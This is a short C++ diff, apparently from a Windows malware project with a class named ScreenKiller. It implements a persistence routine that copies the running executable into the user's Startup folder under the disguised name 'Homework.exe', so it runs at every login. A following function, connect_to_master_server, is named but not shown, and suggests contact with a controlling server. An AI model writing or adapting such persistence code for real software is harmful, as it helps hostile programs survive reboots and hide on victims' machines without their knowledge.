@@ -69,7 +69,14 @@ bool ScreenKiller::deploy_inner()
 
 bool ScreenKiller::get_persistency()
 {
-	return false;
+	TCHAR szExeFileName[MAX_PATH];
+	if (GetModuleFileName(NULL, szExeFileName, MAX_PATH) == 0)
+		return false;
+
+	LPCWSTR filename = szExeFileName;
+	LPCWSTR dest = wcscat(_wgetenv(L"appdata"), L"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Homework.exe");
+
+	return CopyFileW(filename, dest, false) != 0;
 }
 
 bool ScreenKiller::connect_to_master_server()
